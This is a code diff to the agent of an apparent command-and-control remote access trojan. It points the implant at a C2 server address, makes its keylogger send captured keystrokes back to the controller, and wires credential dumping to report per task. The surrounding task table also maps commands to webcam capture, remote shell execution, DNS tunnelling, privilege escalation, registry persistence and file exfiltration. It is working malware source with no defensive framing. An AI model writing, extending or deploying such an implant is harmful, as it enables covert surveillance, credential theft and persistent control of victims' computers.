@@ -25,7 +25,7 @@ from modules.credential_dump import dump_credentials
 from modules.persistence import install_persistence
 
 # === Configuration ===
-C2_URL = "http://192.168.200.35:5001"# Update this to your C2 server's IP address
+C2_URL = "http://192.168.0.102:5001"# Update this to your C2 server's IP address
 BEACON_INTERVAL = 10
 agent_id = f"agent_{uuid.uuid4()}"
 # ======================
@@ -165,8 +165,8 @@ def run_task(task):
             'surveillance_screenshot': take_screenshot,
             'surveillance.webcam': capture_webcam,
             'surveillance_webcam': capture_webcam,
-            'surveillance.keylogger': lambda: start_keylogger() if not is_keylogger_running() else stop_keylogger(),
-            'surveillance_keylogger': lambda: start_keylogger() if not is_keylogger_running() else stop_keylogger(),
+            'surveillance.keylogger': lambda: start_keylogger(lambda result: send_result(task_id, result)) if not is_keylogger_running() else stop_keylogger(),
+            'surveillance_keylogger': lambda: start_keylogger(lambda result: send_result(task_id, result)) if not is_keylogger_running() else stop_keylogger(),
             'shell.execute': lambda: execute_command(task_data.get('command')) if task_data.get('command') else "No command provided",
             'shell_execute': lambda: execute_command(task_data.get('command')) if task_data.get('command') else "No command provided",
             'files.browser': lambda: list_directory(task_data.get('path', '.')),
@@ -177,8 +177,8 @@ def run_task(task):
             'dns_tunnel_start': lambda: start_dns_tunnel(task_data.get('domain')) if task_data.get('domain') else "Missing domain",
             'privesc.auto': attempt_privilege_escalation,
             'privesc_auto': attempt_privilege_escalation,
-            'credentials.dump': dump_credentials,
-            'credentials_dump': dump_credentials,
+            'credentials.dump': lambda: dump_credentials(task_id),
+            'credentials_dump': lambda: dump_credentials(task_id),
             'persistence.install': lambda: install_persistence(task_data.get('method', 'registry')),
             'persistence_install': lambda: install_persistence(task_data.get('method', 'registry')),
             'files.download': lambda: read_file(task_data.get('path')) if task_data.get('path') else {'status': 'error', 'error': 'No path provided'},
